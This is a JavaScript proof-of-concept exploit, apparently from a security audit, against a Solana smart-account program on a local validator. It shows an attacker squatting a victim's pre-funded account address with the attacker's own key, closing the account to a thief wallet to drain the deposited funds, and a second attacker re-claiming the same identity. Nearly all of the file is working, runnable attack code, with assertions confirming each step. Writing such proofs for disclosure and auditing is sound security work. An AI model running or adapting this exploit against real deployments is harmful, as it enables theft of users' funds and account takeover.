// ANT-860 PoC-A (B1): squat + close + re-claim, SVM. Isolated validator only.
import assert from "node:assert/strict";
import crypto from "node:crypto";
import { Connection, Keypair, PublicKey, SystemProgram, Transaction, sendAndConfirmTransaction, TransactionInstruction } from "@solana/web3.js";
const PROGRAM = new PublicKey("4KLMwD1EHjkFPf3DUSeJn55Co529matzUVv2yrpvPC8a");
const SECP = new PublicKey("Secp256r1SigVerify1111111111111111111111111");
const INSTRUCTIONS = new PublicKey("Sysvar1nstructions1111111111111111111111111");
const DOMAIN_V3 = Buffer.from("PID|SOLANA|SMART_ACCOUNT|v3");
const AUTH_PREFIX = crypto.createHash("sha256").update("test-rp").digest();
const N = BigInt("0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551");
const OP = { close: 4, activate: 5 };
const POLICY_V1 = 1;
const conn = new Connection("http://127.0.0.1:18999", "confirmed");
const sha256 = (b) => crypto.createHash("sha256").update(b).digest();
const b64url = (b) => Buffer.from(b).toString("base64url");
const pidToSeed32 = (pid) => sha256(Buffer.from(pid.trim().toLowerCase(), "utf8"));
const [TREASURY_PDA] = PublicKey.findProgramAddressSync([Buffer.from("treasury")], PROGRAM);
function lowS(sig) { const r = BigInt("0x" + sig.subarray(0, 32).toString("hex")); let s = BigInt("0x" + sig.subarray(32).toString("hex")); if (s > N / 2n) s = N - s; const b = Buffer.alloc(64); Buffer.from(r.toString(16).padStart(64, "0"), "hex").copy(b, 0); Buffer.from(s.toString(16).padStart(64, "0"), "hex").copy(b, 32); return b; }
function compressedPub(pub) { const der = pub.export({ format: "der", type: "spki" }); const raw = der.subarray(der.length - 65); const X = raw.subarray(1, 33); return Buffer.concat([Buffer.from([(raw[64] & 1) ? 0x03 : 0x02]), X]); }
function authData() { return Buffer.concat([AUTH_PREFIX, Buffer.from([0x05]), Buffer.from([0, 0, 0, 1])]); }
function signPayload(kp, payloadHash) {
  const clientDataJSON = Buffer.from(JSON.stringify({ type: "webauthn.get", challenge: b64url(payloadHash), origin: "test.invalid" }));
  const messageData = Buffer.concat([authData(), sha256(clientDataJSON)]);
  const sig = lowS(crypto.sign("sha256", messageData, { key: kp.privateKey, dsaEncoding: "ieee-p1363" }));
  return { clientDataJSON, messageData, sig, comp: compressedPub(kp.publicKey) };
}
function buildSecpIx(pubkeyComp, sigRaw, messageData) { const o = Buffer.alloc(14); o.writeUInt16LE(49, 0); o.writeUInt16LE(0xffff, 2); o.writeUInt16LE(16, 4); o.writeUInt16LE(0xffff, 6); o.writeUInt16LE(113, 8); o.writeUInt16LE(messageData.length, 10); o.writeUInt16LE(0xffff, 12); return new TransactionInstruction({ keys: [], programId: SECP, data: Buffer.concat([Buffer.from([1, 0]), o, pubkeyComp, sigRaw, messageData]) }); }
const u64 = (v) => { const b = Buffer.alloc(8); b.writeBigUInt64LE(BigInt(v)); return b; };
const i64 = (v) => { const b = Buffer.alloc(8); b.writeBigInt64LE(BigInt(v)); return b; };
const u16 = (v) => { const b = Buffer.alloc(2); b.writeUInt16LE(v); return b; };
const liveNow = async () => conn.getBlockTime(await conn.getSlot());

const kA = crypto.generateKeyPairSync("ec", { namedCurve: "prime256v1" });
const kB = crypto.generateKeyPairSync("ec", { namedCurve: "prime256v1" });
const authA = compressedPub(kA.publicKey), authB = compressedPub(kB.publicKey);
const payer = Keypair.generate();
await conn.confirmTransaction(await conn.requestAirdrop(payer.publicKey, 10e9), "confirmed");
const pid = pidToSeed32("pocreclaim@pid");
const [pda] = PublicKey.findProgramAddressSync([Buffer.from("peridot_id"), Buffer.from("account"), pid], PROGRAM);
console.log("PDA", pda.toBase58());
// 1. victim (off-chain) pre-funds counterfactual PDA with 1 SOL
await conn.confirmTransaction(await sendAndConfirmTransaction(conn, new Transaction().add(SystemProgram.transfer({ fromPubkey: payer.publicKey, toPubkey: pda, lamports: 1e9 })), [payer], { commitment: "confirmed" }), "confirmed");
console.log("pre-fund PDA lamports:", (await conn.getAccountInfo(pda)).lamports);
// 2. attacker squats with OWN key
{
  const exp = await liveNow().then(t => t + 300);
  const h = sha256(Buffer.concat([DOMAIN_V3, Buffer.from([OP.activate]), pid, authA, u16(POLICY_V1), i64(exp)]));
  const s = signPayload(kA, h);
  await sendAndConfirmTransaction(conn, new Transaction().add(new TransactionInstruction({ keys: [{ pubkey: payer.publicKey, isSigner: true, isWritable: true }, { pubkey: pda, isSigner: false, isWritable: true }, { pubkey: TREASURY_PDA, isSigner: false, isWritable: true }, { pubkey: SystemProgram.programId, isSigner: false, isWritable: false }, { pubkey: INSTRUCTIONS, isSigner: false, isWritable: false }], programId: PROGRAM, data: Buffer.concat([Buffer.from([5]), pid, authA, u16(POLICY_V1), i64(exp), u64(0n), u16(s.clientDataJSON.length), s.clientDataJSON]) }), buildSecpIx(s.comp, s.sig, s.messageData)), [payer], { commitment: "confirmed", skipPreflight: true });
  const acc = await conn.getAccountInfo(pda);
  assert.ok(acc && Buffer.from(acc.data.subarray(12, 45)).equals(authA), "attacker authority stored");
  console.log("SQUAT-OK authority=A lamports:", acc.lamports);
}
// 3. attacker closes to own wallet (nonce 0), pocketing rent + pre-fund
const thief = Keypair.generate();
{
  const exp = await liveNow().then(t => t + 300);
  const h = sha256(Buffer.concat([DOMAIN_V3, Buffer.from([OP.close]), pid, u64(0n), thief.publicKey.toBuffer(), i64(exp)]));
  const s = signPayload(kA, h);
  const wd = (d, f, j) => { const l = Buffer.alloc(2); l.writeUInt16LE(j.length); return Buffer.concat([Buffer.from([4]), ...f, l, j]); };
  await sendAndConfirmTransaction(conn, new Transaction().add(new TransactionInstruction({ keys: [{ pubkey: pda, isSigner: false, isWritable: true }, { pubkey: thief.publicKey, isSigner: false, isWritable: true }, { pubkey: INSTRUCTIONS, isSigner: false, isWritable: false }], programId: PROGRAM, data: wd(4, [u64(0n), i64(exp)], s.clientDataJSON) }), buildSecpIx(s.comp, s.sig, s.messageData)), [payer], { commitment: "confirmed", skipPreflight: true });
  assert.equal(await conn.getAccountInfo(pda), null, "PDA closed");
  console.log("CLOSE-OK thief lamports:", (await conn.getAccountInfo(thief.publicKey)).lamports);
}
// 4. second attacker re-claims SAME pid with DIFFERENT key (no tombstone)
{
  const exp = await liveNow().then(t => t + 300);
  const h = sha256(Buffer.concat([DOMAIN_V3, Buffer.from([OP.activate]), pid, authB, u16(POLICY_V1), i64(exp)]));
  const s = signPayload(kB, h);
  await sendAndConfirmTransaction(conn, new Transaction().add(new TransactionInstruction({ keys: [{ pubkey: payer.publicKey, isSigner: true, isWritable: true }, { pubkey: pda, isSigner: false, isWritable: true }, { pubkey: TREASURY_PDA, isSigner: false, isWritable: true }, { pubkey: SystemProgram.programId, isSigner: false, isWritable: false }, { pubkey: INSTRUCTIONS, isSigner: false, isWritable: false }], programId: PROGRAM, data: Buffer.concat([Buffer.from([5]), pid, authB, u16(POLICY_V1), i64(exp), u64(0n), u16(s.clientDataJSON.length), s.clientDataJSON]) }), buildSecpIx(s.comp, s.sig, s.messageData)), [payer], { commitment: "confirmed", skipPreflight: true });
  const acc = await conn.getAccountInfo(pda);
  assert.ok(acc && Buffer.from(acc.data.subarray(12, 45)).equals(authB), "second attacker authority stored");
  console.log("RECLAIM-OK authority=B");
}
console.log("POC-A DONE: squat + close-drain + reclaim all succeeded (B1 TERBUKTI)");
